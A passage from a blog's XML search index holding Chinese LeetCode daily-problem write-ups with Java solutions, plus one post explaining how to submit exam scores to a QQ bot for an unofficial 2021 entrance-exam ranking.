    <content type="text"><![CDATA[题目：503. 下一个更大元素 II难度：中等 给定一个循环数组（最后一个元素的下一个元素是数组的第一个元素），输出每个元素的下一个更大元素。数字 x 的下一个更大的元素是按数组遍历顺序，这个数字之后的第一个比它更大的数，这意味着你应该循环地搜索它的下一个更大的数。如果不存在，则输出 -1。 示例 1: 12345输入: [1,2,1]输出: [2,-1,2]解释: 第一个 1 的下一个更大的数是 2；数字 2 找不到下一个更大的数； 第二个 1 的下一个最大的数需要循环搜索，结果也是 2。 注意: 输入数组的长度不会超过 10000。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/next-greater-element-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护一个单调栈 解题代码1234567891011121314151617class Solution &#123; public int[] nextGreaterElements(int[] nums) &#123; int n = nums.length; int[] ans = new int[n]; Arrays.fill(ans,-1); Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); for (int i = 0;i &lt; 2 * n;i++) &#123; int index = i % n; int num = nums[index]; while (!s.isEmpty() &amp;&amp; num &gt; nums[s.peek()]) &#123; ans[s.pop()] = num; &#125; s.push(index); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>单调栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/5]]></title>
    <url>%2Fposts%2F9987934b%2F</url>
    <content type="text"><![CDATA[题目：232. 用栈实现队列难度：简单 请你仅使用两个栈实现先入先出队列。队列应当支持一般队列的支持的所有操作（push、pop、peek、empty）： 实现 MyQueue 类： void push(int x) 将元素 x 推到队列的末尾 int pop() 从队列的开头移除并返回元素 int peek() 返回队列开头的元素 boolean empty() 如果队列为空，返回 true ；否则，返回 false 说明： 你只能使用标准的栈操作 —— 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。 你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。 进阶： 你能否实现每个操作均摊时间复杂度为 O(1) 的队列？换句话说，执行 n 个操作的总时间复杂度为 O(n) ，即使其中一个操作可能花费较长时间。 示例： 12345678910111213输入：[&quot;MyQueue&quot;, &quot;push&quot;, &quot;push&quot;, &quot;peek&quot;, &quot;pop&quot;, &quot;empty&quot;][[], [1], [2], [], [], []]输出：[null, null, null, 1, 1, false]解释：MyQueue myQueue = new MyQueue();myQueue.push(1); // queue is: [1]myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)myQueue.peek(); // return 1myQueue.pop(); // return 1, queue is [2]myQueue.empty(); // return false 提示： 1 &lt;= x &lt;= 9 最多调用 100 次 push、pop、peek 和 empty 假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/implement-queue-using-stacks/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护两个栈，一个输入，一个输出 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class MyQueue &#123; Stack&lt;Integer&gt; in; Stack&lt;Integer&gt; out; /** Initialize your data structure here. */ public MyQueue() &#123; in = new Stack&lt;&gt;(); out = new Stack&lt;&gt;(); &#125; /** Push element x to the back of queue. */ public void push(int x) &#123; in.push(x); &#125; /** Removes the element from in front of queue and returns that element. */ public int pop() &#123; refresh(); return out.pop(); &#125; /** Get the front element. */ public int peek() &#123; refresh(); return out.peek(); &#125; /** Returns whether the queue is empty. */ public boolean empty() &#123; return in.isEmpty() &amp;&amp; out.isEmpty(); &#125; private void refresh() &#123; if (out.isEmpty()) &#123; while (!in.isEmpty()) &#123; out.push(in.pop()); &#125; &#125; &#125;&#125;/** * Your MyQueue object will be instantiated and called as such: * MyQueue obj = new MyQueue(); * obj.push(x); * int param_2 = obj.pop(); * int param_3 = obj.peek(); * boolean param_4 = obj.empty(); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/3]]></title>
    <url>%2Fposts%2F70e4367e%2F</url>
    <content type="text"><![CDATA[题目：338. 比特位计数难度：中等 给定一个非负整数 num 。对于 *0 ≤ i ≤ num * 范围中的每个数字 *i * ，计算其二进制数中的 1 的数目并将它们作为数组返回。 示例 1: 12输入: 2输出: [0,1,1] 示例 2: 12输入: 5输出: [0,1,1,2,1,2] 进阶: 给出时间复杂度为 O(n*sizeof(integer)) 的解答非常容易。但你可以在线性时间 O(n) 内用一趟扫描做到吗？ 要求算法的空间复杂度为 O(n) 。 你能进一步完善解法吗？要求在C++或任何其他语言中不使用任何内置函数（如 C++ 中的 __builtin_popcount ）来执行此操作。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/counting-bits/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 从高位有效的1递推 解题代码123456789101112131415class Solution &#123; public int[] countBits(int num) &#123; int[] ans = new int[num + 1]; int high = 0; for (int i = 1;i &lt;= num;i++) &#123; if ((i &amp; (i - 1)) == 0) &#123; high = i; &#125; ans[i] = ans[i - high] + 1; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/2]]></title>
    <url>%2Fposts%2F7e306e8%2F</url>
    <content type="text"><![CDATA[题目：304. 二维区域和检索 - 矩阵不可变难度：中等 给定一个二维矩阵，计算其子矩形范围内元素的总和，该子矩阵的左上角为 (row1, col1) ，右下角为 (row2, col2) 。 上图子矩阵左上角 (row1, col1) = (2, 1) ，右下角(row2, col2) = (4, 3)， 该子矩形内元素的总和为 8。 示例： 1234567891011给定 matrix = [ [3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]sumRegion(2, 1, 4, 3) -&gt; 8sumRegion(1, 1, 2, 2) -&gt; 11sumRegion(1, 2, 2, 4) -&gt; 12 提示： 你可以假设矩阵不可变。 会多次调用 sumRegion 方法。 你可以假设 row1 ≤ row2 且 col1 ≤ col2 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/range-sum-query-2d-immutable/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 还是前缀和 解题代码1234567891011121314151617181920212223242526class NumMatrix &#123; int[][] sum; public NumMatrix(int[][] matrix) &#123; int m = matrix.length; if (m &gt; 0) &#123; int n = matrix[0].length; sum = new int[m + 1][n + 1]; for (int i = 0;i &lt; m;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; sum[i + 1][j + 1] = sum[i + 1][j] + sum[i][j + 1] - sum[i][j] + matrix[i][j]; &#125; &#125; &#125; &#125; public int sumRegion(int row1, int col1, int row2, int col2) &#123; return sum[row2 + 1][col2 + 1] - sum[row1][col2 + 1] - sum[row2 + 1][col1] + sum[row1][col1]; &#125;&#125;/** * Your NumMatrix object will be instantiated and called as such: * NumMatrix obj = new NumMatrix(matrix); * int param_1 = obj.sumRegion(row1,col1,row2,col2); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/1]]></title>
    <url>%2Fposts%2F9eea5752%2F</url>
    <content type="text"><![CDATA[题目：303. 区域和检索 - 数组不可变难度：简单 给定一个整数数组 nums，求出数组从索引 i 到 j（i ≤ j）范围内元素的总和，包含 i、j 两点。 实现 NumArray 类： NumArray(int[] nums) 使用数组 nums 初始化对象 int sumRange(int i, int j) 返回数组 nums 从索引 i 到 j（i ≤ j）范围内元素的总和，包含 i、j 两点（也就是 sum(nums[i], nums[i + 1], … , nums[j])） 示例： 1234567891011输入：[&quot;NumArray&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;][[[-2, 0, 3, -5, 2, -1]], [0, 2], [2, 5], [0, 5]]输出：[null, 1, -1, -3]解释：NumArray numArray = new NumArray([-2, 0, 3, -5, 2, -1]);numArray.sumRange(0, 2); // return 1 ((-2) + 0 + 3)numArray.sumRange(2, 5); // return -1 (3 + (-5) + 2 + (-1)) numArray.sumRange(0, 5); // return -3 ((-2) + 0 + 3 + (-5) + 2 + (-1)) 提示： 0 &lt;= nums.length &lt;= 104 -105 &lt;= nums[i] &lt;= 105 0 &lt;= i &lt;= j &lt; nums.length 最多调用 104 次 sumRange 方法 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/range-sum-query-immutable/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 前缀和 解题代码12345678910111213141516171819class NumArray &#123; int[] sum; public NumArray(int[] nums) &#123; sum = new int[nums.length + 1]; for (int i = 0;i &lt; nums.length;i++) &#123; sum[i + 1] = sum[i] + nums[i]; &#125; &#125; public int sumRange(int i, int j) &#123; return sum[j + 1] - sum[i]; &#125;&#125;/** * Your NumArray object will be instantiated and called as such: * NumArray obj = new NumArray(nums); * int param_1 = obj.sumRange(i,j); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/28]]></title>
    <url>%2Fposts%2Fec6ab93a%2F</url>
    <content type="text"><![CDATA[题目：896. 单调数列难度：简单 如果数组是单调递增或单调递减的，那么它是单调的。 如果对于所有 i &lt;= j，A[i] &lt;= A[j]，那么数组 A 是单调递增的。 如果对于所有 i &lt;= j，A[i]&gt; = A[j]，那么数组 A 是单调递减的。 当给定的数组 A 是单调数组时返回 true，否则返回 false。 示例 1： 12输入：[1,2,2,3]输出：true 示例 2： 12输入：[6,5,4,4]输出：true 示例 3： 12输入：[1,3,2]输出：false 示例 4： 12输入：[1,2,4,5]输出：true 示例 5： 12输入：[1,1,1]输出：true 提示： 1 &lt;= A.length &lt;= 50000 -100000 &lt;= A[i] &lt;= 100000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/monotonic-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 一次遍历 解题代码1234567891011121314151617class Solution &#123; public boolean isMonotonic(int[] A) &#123; boolean add = true; boolean reduce = true; int n = A.length; int p = 0; while (p + 1 &lt; n) &#123; if (A[p] &lt; A[p + 1]) &#123; reduce = false; &#125; else if (A[p] &gt; A[p + 1]) &#123; add = false; &#125; p++; &#125; return add || reduce; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[志愿君|成信大2021初试排名机器人使用指南]]></title>
    <url>%2Fposts%2F1dad1ccf%2F</url>
    <content type="text"><![CDATA[前言 因初试成绩查询结果没有排名，一些排名公众号也存在一些水分，所以发起这个志愿机器人项目，用于给成信大2021备考学子提供参考，公布排名时敏感信息会脱敏处理，不会泄露个人信息 给大家说声抱歉，由于测试不到位，Android端设备会有序列化的漏洞，请尽量使用pc端，我会在适当的时候修复此问题 已修复 使用方法 添加机器人(2535283330)为好友 向机器人发送消息，模板如下 12345678姓名：张三报考学院：计算机学院学硕/专硕：专硕全日制/非全日制：全日制政治：55英语：55数学：120专业课：99 成功或者失败，你都会收到回复，类似下面这样，但请注意，如果你没有收到机器人的回复，这个原因可能是服务器在重启更新，代表没有录入成功，此时，请稍后重新尝试一次，谢谢 12感谢支持，您的信息录入/更新成功，您是第1位志愿者 # 成功，这个第几个志愿者，不是排名信息，仅代表已经成功录入信息的志愿者人数输入不合法 # 失败 为保证收集信息的真实性，请在发送上面文字消息之后，发送一张截图您的成绩截图（保证准考证号不打码）到机器人，感谢大家的支持 如果想修改信息，只需要重新发送一次消息即可 注意事项 一个qq号关联一个结果，即不允许代他人提交信息 排名结果会在志愿人数达到一定程度之后公布在QQ群（343659014） 拓展计划 开源 图像识别 实时排名 主动消息推送]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>志愿项目</tag>
        <tag>初试排名</tag>
        <tag>成信大</tag>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/25]]></title>
    <url>%2Fposts%2F92dbc587%2F</url>
    <content type="text"><![CDATA[题目：867. 转置矩阵难度：简单 给你一个二维整数数组 matrix， 返回 matrix 的 转置矩阵 。 矩阵的 转置 是指将矩阵的主对角线翻转，交换矩阵的行索引与列索引。 示例 1： 12输入：matrix = [[1,2,3],[4,5,6],[7,8,9]]输出：[[1,4,7],[2,5,8],[3,6,9]] 示例 2： 12输入：matrix = [[1,2,3],[4,5,6]]输出：[[1,4],[2,5],[3,6]] 提示： m == matrix.length n == matrix[i].length 1 &lt;= m, n &lt;= 1000 1 &lt;= m * n &lt;= 105 -109 &lt;= matrix[i][j] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/transpose-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 今天写了个寂寞 解题代码123456789101112131415class Solution &#123; public int[][] transpose(int[][] matrix) &#123; int m = matrix.length; int n = matrix[0].length; int[][] ans = new int[n][m]; for (int i = 0;i &lt; m;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; ans[j][i] = matrix[i][j]; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/24]]></title>
    <url>%2Fposts%2Fe5dcf511%2F</url>
    <content type="text"><![CDATA[题目：832. 翻转图像难度：简单 给定一个二进制矩阵 A，我们想先水平翻转图像，然后反转图像并返回结果。 水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 [1, 1, 0] 的结果是 [0, 1, 1]。 反转图片的意思是图片中的 0 全部被 1 替换， 1 全部被 0 替换。例如，反转 [0, 1, 1] 的结果是 [1, 0, 0]。 示例 1： 1234输入：[[1,1,0],[1,0,1],[0,0,0]]输出：[[1,0,0],[0,1,0],[1,1,1]]解释：首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]； 然后反转图片: [[1,0,0],[0,1,0],[1,1,1]] 示例 2： 1234输入：[[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]输出：[[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]解释：首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]； 然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]] 提示： 1 &lt;= A.length = A[0].length &lt;= 20 0 &lt;= A[i][j] &lt;= 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/flipping-an-image/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟过程即可 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; public int[][] flipAndInvertImage(int[][] A) &#123; for (int i = 0;i &lt; A.length;i++) &#123; flip(A[i]); &#125; reverse(A); return A; &#125; private void flip(int[] A) &#123; for (int i = 0;i &lt; A.length / 2;i++) &#123; swap(A,i,A.length - 1 - i); &#125; &#125; private void swap(int[] A,int i,int j) &#123; int t = A[i]; A[i] = A[j]; A[j] = t; &#125; private void reverse(int[][] A) &#123; for (int i = 0;i &lt; A.length;i++) &#123; for (int j = 0;j &lt; A[i].length;j++) &#123; if (A[i][j] == 0) &#123; A[i][j] = 1; &#125; else &#123; A[i][j] = 0; &#125; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/23]]></title>
    <url>%2Fposts%2F7bb860b2%2F</url>
    <content type="text"><![CDATA[题目：1052. 爱生气的书店老板难度：中等 今天，书店老板有一家店打算试营业 customers.length 分钟。每分钟都有一些顾客（customers[i]）会进入书店，所有这些顾客都会在那一分钟结束后离开。 在某些时候，书店老板会生气。 如果书店老板在第 i 分钟生气，那么 grumpy[i] = 1，否则 grumpy[i] = 0。 当书店老板生气时，那一分钟的顾客就会不满意，不生气则他们是满意的。 书店老板知道一个秘密技巧，能抑制自己的情绪，可以让自己连续 X 分钟不生气，但却只能使用一次。 请你返回这一天营业下来，最多有多少客户能够感到满意的数量。 示例： 12345输入：customers = [1,0,1,2,1,1,7,5], grumpy = [0,1,0,1,0,1,0,1], X = 3输出：16解释：书店老板在最后 3 分钟保持冷静。感到满意的最大客户数量 = 1 + 1 + 1 + 1 + 7 + 5 = 16. 提示： 1 &lt;= X &lt;= customers.length == grumpy.length &lt;= 20000 0 &lt;= customers[i] &lt;= 1000 0 &lt;= grumpy[i] &lt;= 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/grumpy-bookstore-owner/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 尽力挽回 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public int maxSatisfied(int[] customers, int[] grumpy, int X) &#123; int ans = 0; for (int i = 0;i &lt; customers.length;i++) &#123; if (grumpy[i] == 0) &#123; ans += customers[i]; &#125; &#125; int retain = 0; int max = 0; for (int i = 0;i &lt; X;i++) &#123; if (grumpy[i] == 1) &#123; retain += customers[i]; &#125; &#125; max = retain; for (int i = X;i &lt; customers.length;i++) &#123; if (grumpy[i - X] == 1) &#123; retain -= customers[i - X]; &#125; if (grumpy[i] == 1) &#123; retain += customers[i]; &#125; max = Math.max(retain,max); &#125; return ans + max; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/22]]></title>
    <url>%2Fposts%2Fcbf5024%2F</url>
    <content type="text"><![CDATA[题目：766. 托普利茨矩阵难度：简单 给你一个 m x n 的矩阵 matrix 。如果这个矩阵是托普利茨矩阵，返回 true ；否则，返回 false 。 如果矩阵上每一条由左上到右下的对角线上的元素都相同，那么这个矩阵是 托普利茨矩阵 。 示例 1： 123456输入：matrix = [[1,2,3,4],[5,1,2,3],[9,5,1,2]]输出：true解释：在上述矩阵中, 其对角线为: &quot;[9]&quot;, &quot;[5, 5]&quot;, &quot;[1, 1, 1]&quot;, &quot;[2, 2, 2]&quot;, &quot;[3, 3]&quot;, &quot;[4]&quot;。 各条对角线上的所有元素均相同, 因此答案是 True 。 示例 2： 1234输入：matrix = [[1,2],[2,2]]输出：false解释：对角线 &quot;[1, 2]&quot; 上的元素不同。 提示： m == matrix.length n == matrix[i].length 1 &lt;= m, n &lt;= 20 0 &lt;= matrix[i][j] &lt;= 99 进阶： 如果矩阵存储在磁盘上，并且内存有限，以至于一次最多只能将矩阵的一行加载到内存中，该怎么办？ 如果矩阵太大，以至于一次只能将不完整的一行加载到内存中，该怎么办？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/toeplitz-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 遍历即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041class Solution &#123; public boolean isToeplitzMatrix(int[][] matrix) &#123; int m = matrix.length; if (m == 0) &#123; return true; &#125; int n = matrix[0].length; if (m == 1 || n == 1) &#123; return true; &#125; for (int r = 0;r &lt; m;r++) &#123; if (!check(matrix,r,0)) &#123; return false; &#125; &#125; for (int c = 1;c &lt; n;c++) &#123; if (!check(matrix,0,c)) &#123; return false; &#125; &#125; return true; &#125; private boolean check(int[][] matrix,int r,int c) &#123; int cur = matrix[r][c]; int m = matrix.length; int n = matrix[0].length; while (r &lt; m &amp;&amp; c &lt; n) &#123; if (cur != matrix[r][c]) &#123; return false; &#125; r++; c++; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/20]]></title>
    <url>%2Fposts%2Fe2b13108%2F</url>
    <content type="text"><![CDATA[题目：697. 数组的度难度：简单 给定一个非空且只包含非负数的整数数组 nums，数组的度的定义是指数组里任一元素出现频数的最大值。 你的任务是在 nums 中找到与 nums 拥有相同大小的度的最短连续子数组，返回其长度。 示例 1： 1234567输入：[1, 2, 2, 3, 1]输出：2解释：输入数组的度是2，因为元素1和2的出现频数最大，均为2.连续子数组里面拥有相同度的有如下所示:[1, 2, 2, 3, 1], [1, 2, 2, 3], [2, 2, 3, 1], [1, 2, 2], [2, 2, 3], [2, 2]最短连续子数组[2, 2]的长度为2，所以返回2. 示例 2： 12输入：[1,2,2,3,1,4,2]输出：6 提示： nums.length 在1到 50,000 区间范围内。 nums[i] 是一个在 0 到 49,999 范围内的整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/degree-of-an-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 三元组记录[出现频度，第一次出现的位置，最后一次出现的位置]，然后扫描 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Solution &#123; public int findShortestSubArray(int[] nums) &#123; Map&lt;Integer,Time&gt; hash = new HashMap&lt;&gt;(); for (int i = 0;i &lt; nums.length;i++) &#123; int k = nums[i]; if (hash.containsKey(k)) &#123; Time t = hash.get(k); t.cnt++; t.last = i; &#125; else &#123; Time t = new Time(i,1,i); hash.put(k,t); &#125; &#125; int maxCnt = 0; int minLen = 0; // System.out.println(hash); for (int k : hash.keySet()) &#123; Time t = hash.get(k); if (maxCnt &lt; t.cnt) &#123; maxCnt = t.cnt; minLen = t.last - t.first; &#125; else if (maxCnt == t.cnt) &#123; minLen = Math.min(minLen,t.last - t.first); &#125; &#125; return minLen + 1; &#125; class Time &#123; int first; int cnt; int last; public Time (int first,int cnt,int last) &#123; this.first = first; this.cnt = cnt; this.last = last; &#125; public String toString() &#123; return String.format("%d [%d %d]",cnt,first,last); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/19]]></title>
    <url>%2Fposts%2Fb040da6f%2F</url>
    <content type="text"><![CDATA[题目：1004. 最大连续1的个数 III难度：中等 给定一个由若干 0 和 1 组成的数组 A，我们最多可以将 K 个值从 0 变成 1 。 返回仅包含 1 的最长（连续）子数组的长度。 示例 1： 12345输入：A = [1,1,1,0,0,0,1,1,1,1,0], K = 2输出：6解释： [1,1,1,0,0,1,1,1,1,1,1]粗体数字从 0 翻转到 1，最长的子数组长度为 6。 示例 2： 12345输入：A = [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K = 3输出：10解释：[0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]粗体数字从 0 翻转到 1，最长的子数组长度为 10。 提示： 1 &lt;= A.length &lt;= 20000 0 &lt;= K &lt;= A.length A[i] 为 0 或 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/max-consecutive-ones-iii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 滑动窗口 解题代码1234567891011121314151617181920212223242526class Solution &#123; public int longestOnes(int[] A, int K) &#123; int n = A.length; int left = 0; int right = 0; int cnt = 0; int ans = 0; while (right &lt; n) &#123; if (A[right] == 0) &#123; cnt++; &#125; if (cnt &gt; K) &#123; if (A[left] == 0) &#123; cnt--; &#125; left++; &#125; right++; ans = Math.max(ans,right - left); &#125; return ans; &#125;&#125; 朴素的双指针，超时 123456789101112131415161718192021class Solution &#123; public int longestOnes(int[] A, int K) &#123; int k = K; int n = A.length; int left = 0; int right = 0; int ans = 0; while (left &lt; n) &#123; while (right &lt; n &amp;&amp; (A[right] == 1 || k-- &gt; 0)) &#123; right++; &#125; ans = Math.max(ans,right - left); left++; right = left; k = K; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/17]]></title>
    <url>%2Fposts%2F57f8f768%2F</url>
    <content type="text"><![CDATA[题目：566. 重塑矩阵难度：简单 在MATLAB中，有一个非常有用的函数 reshape，它可以将一个矩阵重塑为另一个大小不同的新矩阵，但保留其原始数据。 给出一个由二维数组表示的矩阵，以及两个正整数r和c，分别表示想要的重构的矩阵的行数和列数。 重构后的矩阵需要将原始矩阵的所有元素以相同的 行遍历顺序 填充。 如果具有给定参数的reshape操作是可行且合理的，则输出新的重塑矩阵；否则，输出原始矩阵。 示例 1: 123456789输入: nums = [[1,2], [3,4]]r = 1, c = 4输出: [[1,2,3,4]]解释:行遍历nums的结果是 [1,2,3,4]。新的矩阵是 1 * 4 矩阵, 用之前的元素值一行一行填充新矩阵。 示例 2: 12345678910输入: nums = [[1,2], [3,4]]r = 2, c = 4输出: [[1,2], [3,4]]解释:没有办法将 2 * 2 矩阵转化为 2 * 4 矩阵。 所以输出原矩阵。 注意： 给定矩阵的宽和高范围在 [1, 100]。 给定的 r 和 c 都是正数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reshape-the-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 内存中数组是连续的 解题代码12345678910111213141516class Solution &#123; public int[][] matrixReshape(int[][] nums, int r, int c) &#123; int n = nums.length; int m = nums[n - 1].length; if (n * m != r * c) &#123; return nums; &#125; int ans[][] = new int[r][c]; for (int i = 0;i &lt; n * m;i++) &#123; ans[i / c][i % c] = nums[i / m][i % m]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/16]]></title>
    <url>%2Fposts%2F20ffc7fe%2F</url>
    <content type="text"><![CDATA[题目：561. 数组拆分 I难度：简单 给定长度为 2n 的整数数组 nums ，你的任务是将这些数分成 n 对, 例如 (a1, b1), (a2, b2), …, (an, bn) ，使得从 1 到 n 的 min(ai, bi) 总和最大。 返回该 最大总和 。 示例 1： 1234567输入：nums = [1,4,3,2]输出：4解释：所有可能的分法（忽略元素顺序）为：1. (1, 4), (2, 3) -&gt; min(1, 4) + min(2, 3) = 1 + 2 = 32. (1, 3), (2, 4) -&gt; min(1, 3) + min(2, 4) = 1 + 2 = 33. (1, 2), (3, 4) -&gt; min(1, 2) + min(3, 4) = 1 + 3 = 4所以最大总和为 4 示例 2： 123输入：nums = [6,2,6,5,1,2]输出：9解释：最优的分法为 (2, 1), (2, 5), (6, 6). min(2, 1) + min(2, 5) + min(6, 6) = 1 + 2 + 6 = 9 提示： 1 &lt;= n &lt;= 104 nums.length == 2 * n -104 &lt;= nums[i] &lt;= 104 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/array-partition-i/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排序后隔位取数求和即可 解题代码123456789101112class Solution &#123; public int arrayPairSum(int[] nums) &#123; Arrays.sort(nums); int ans = 0; for (int i = 0;i &lt; nums.length;i+=2) &#123; ans += nums[i]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/15]]></title>
    <url>%2Fposts%2Fb9f69644%2F</url>
